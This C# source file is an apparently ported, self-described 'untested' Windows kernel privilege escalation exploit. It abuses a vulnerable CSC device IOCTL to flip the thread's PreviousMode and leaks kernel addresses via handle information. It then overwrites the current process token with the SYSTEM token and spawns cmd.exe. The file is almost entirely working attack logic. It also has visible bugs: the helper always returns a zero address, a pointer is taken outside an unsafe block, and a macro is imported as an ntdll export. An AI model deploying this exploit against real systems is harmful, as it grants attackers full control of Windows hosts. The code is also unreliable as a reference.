using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

// untested c# version by blockchainexpert2022 aka slnxp aka rnw <=> blockchainexpert2022 _at_ protonmail.com
class Program
{
    private const int STATUS_SUCCESS = 0;
    private const uint EPROCESS_TOKEN_OFFSET = 0x4B8;
    private const uint KTHREAD_PREVIOUS_MODE_OFFSET = 0x232;
    private const uint CSC_DEV_FCB_XXX_CONTROL_FILE = 0x001401a3; // vuln ioctl
    private const int SystemHandleInformation = 0x10;
    private const int SystemHandleInformationSize = 0x400000;

    private enum _MODE
    {
        KernelMode = 0,
        UserMode = 1
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
    {
        public ushort UniqueProcessId;
        public ushort CreatorBackTraceIndex;
        public byte ObjectTypeIndex;
        public byte HandleAttributes;
        public ushort HandleValue;
        public IntPtr Object;
        public uint GrantedAccess;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SYSTEM_HANDLE_INFORMATION
    {
        public uint NumberOfHandles;
        public IntPtr Handles;
    }

    [DllImport("ntdll.dll")]
    private static extern int NtQuerySystemInformation(
        int SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        out int ReturnLength
    );

    [DllImport("ntdll.dll")]
    private static extern int NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        IntPtr Buffer,
        int BufferLength,
        out int NumberOfBytesWritten
    );

    [DllImport("ntdll.dll")]
    private static extern int NtFsControlFile(
        IntPtr FileHandle,
        IntPtr Event,
        IntPtr ApcRoutine,
        IntPtr ApcContext,
        ref IO_STATUS_BLOCK IoStatusBlock,
        uint FsControlCode,
        IntPtr InputBuffer,
        int InputBufferLength,
        IntPtr OutputBuffer,
        int OutputBufferLength
    );

    [StructLayout(LayoutKind.Sequential)]
    private struct IO_STATUS_BLOCK
    {
        public IntPtr status;
        public IntPtr information;
    }

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    private static extern int NtCreateFile(
        out IntPtr FileHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref IO_STATUS_BLOCK IoStatusBlock,
        IntPtr AllocationSize,
        uint FileAttributes,
        uint ShareAccess,
        uint CreateDisposition,
        uint CreateOptions,
        IntPtr EaBuffer,
        uint EaLength
    );

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcessHeap();

    [DllImport("kernel32.dll")]
    private static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);

    [DllImport("kernel32.dll")]
    private static extern IntPtr HeapReAlloc(IntPtr hHeap, uint dwFlags, IntPtr lpMem, uint dwBytes);

    [DllImport("kernel32.dll")]
    private static extern bool HeapFree(IntPtr hHeap, uint dwFlags, IntPtr lpMem);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern uint GetCurrentProcessId();

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    private static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, string SourceString);

    [DllImport("ntdll.dll")]
    private static extern void InitializeObjectAttributes(ref OBJECT_ATTRIBUTES p, ref UNICODE_STRING n, uint a, IntPtr r, IntPtr s);

    private static int GetObjPtr(out ulong ppObjAddr, uint ulPid, IntPtr handle)
    {
        int ret = -1;
        IntPtr pHandleInfo = IntPtr.Zero;
        int ulBytes = SystemHandleInformationSize;
        int status = STATUS_SUCCESS;

        while ((status = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, out ulBytes)) == 0xC0000004)
        {
            if (pHandleInfo != IntPtr.Zero)
            {
                pHandleInfo = HeapReAlloc(GetProcessHeap(), 0x00000008, pHandleInfo, (uint)(2 * ulBytes));
            }
            else
            {
                pHandleInfo = HeapAlloc(GetProcessHeap(), 0x00000008, (uint)(2 * ulBytes));
            }
        }

        if (status != STATUS_SUCCESS)
        {
            ret = status;
            goto done;
        }

        SYSTEM_HANDLE_INFORMATION handleInfo = Marshal.PtrToStructure<SYSTEM_HANDLE_INFORMATION>(pHandleInfo);
        SYSTEM_HANDLE_TABLE_ENTRY_INFO[] handleEntries = new SYSTEM_HANDLE_TABLE_ENTRY_INFO[handleInfo.NumberOfHandles];

        IntPtr pHandleEntry = handleInfo.Handles;
        for (uint i = 0; i < handleInfo.NumberOfHandles; i++)
        {
            handleEntries[i] = Marshal.PtrToStructure<SYSTEM_HANDLE_TABLE_ENTRY_INFO>(pHandleEntry);
            pHandleEntry = (IntPtr)((long)pHandleEntry + Marshal.SizeOf(handleEntries[i]));

            if ((handleEntries[i].UniqueProcessId == ulPid) && (handleEntries[i].HandleValue == (ushort)handle.ToInt32()))
            {
                ppObjAddr = (ulong)handleEntries[i].Object.ToInt64();
                ret = 0;
                break;
            }
        }

    done:
        if (pHandleInfo != IntPtr.Zero)
        {
            HeapFree(GetProcessHeap(), 0, pHandleInfo);
        }
        ppObjAddr = 0;
        return ret;
    }

    private static int Write64(IntPtr dst, IntPtr src, int size)
    {
        int status = 0;
        int cbNumOfBytesWrite = 0;

        status = NtWriteVirtualMemory(GetCurrentProcess(), dst, src, size, out cbNumOfBytesWrite);
        if (status != STATUS_SUCCESS)
        {
            return -1;
        }
        return status;
    }

    private static int Exploit()
    {
        UNICODE_STRING objectName = new UNICODE_STRING();
        OBJECT_ATTRIBUTES objectAttr = new OBJECT_ATTRIBUTES();
        IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
        IntPtr handle;
        int status = 0;

        ulong Sysproc = 0;
        ulong Curproc = 0;
        ulong Curthread = 0;
        ulong Token = 0;

        IntPtr hCurproc = IntPtr.Zero;
        IntPtr hThread = IntPtr.Zero;
        int ret = 0;
        byte mode = (byte)_MODE.UserMode;

        RtlInitUnicodeString(ref objectName, @"\Device\Mup\;Csc\.\.");
        InitializeObjectAttributes(ref objectAttr, ref objectName, 0, IntPtr.Zero, IntPtr.Zero);

        status = NtCreateFile(out handle, 0x100000, ref objectAttr, ref iosb, IntPtr.Zero, 0x80, 0, 0x1, 0x40, IntPtr.Zero, 0);
        if (status != STATUS_SUCCESS)
        {
            Console.WriteLine($"[-] NtCreateFile failed with status = {status:X}\n");
            return status;
        }

        ret = GetObjPtr(out Sysproc, 4, new IntPtr(4));
        if (ret != STATUS_SUCCESS)
        {
            return ret;
        }
        Console.WriteLine($"[+] System EPROCESS address = {Sysproc:X}\n");

        hThread = OpenThread(0x0040, true, GetCurrentThreadId());
        if (hThread != IntPtr.Zero)
        {
            ret = GetObjPtr(out Curthread, GetCurrentProcessId(), hThread);
            if (ret != STATUS_SUCCESS)
            {
                return ret;
            }
            Console.WriteLine($"[+] Current THREAD address = {Curthread:X}\n");
        }

        hCurproc = OpenProcess(0x0400, true, GetCurrentProcessId());
        if (hCurproc != IntPtr.Zero)
        {
            ret = GetObjPtr(out Curproc, GetCurrentProcessId(), hCurproc);
            if (ret != STATUS_SUCCESS)
            {
                return ret;
            }
            Console.WriteLine($"[+] Current EPROCESS address = {Curproc:X}\n");
        }

        status = NtFsControlFile(handle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, CSC_DEV_FCB_XXX_CONTROL_FILE, (IntPtr)(Curthread + KTHREAD_PREVIOUS_MODE_OFFSET - 0x18), 0, IntPtr.Zero, 0);
        if (status != STATUS_SUCCESS)
        {
            Console.WriteLine($"[-] NtFsControlFile failed with status = {status:X}\n");
            return status;
        }

        Console.WriteLine("[!] Leveraging DKOM to achieve LPE\n");
        Console.WriteLine("[!] Calling Write64 wrapper to overwrite current EPROCESS->Token\n");

        Write64((IntPtr)(Curproc + EPROCESS_TOKEN_OFFSET), (IntPtr)(Sysproc + EPROCESS_TOKEN_OFFSET), 8);

        Write64((IntPtr)(Curthread + KTHREAD_PREVIOUS_MODE_OFFSET), (IntPtr)(&mode), 1);

        Process.Start("cmd.exe");

        return STATUS_SUCCESS;
    }

    static void Main(string[] args)
    {
        int status = Exploit();
        Environment.Exit(status);
    }
}
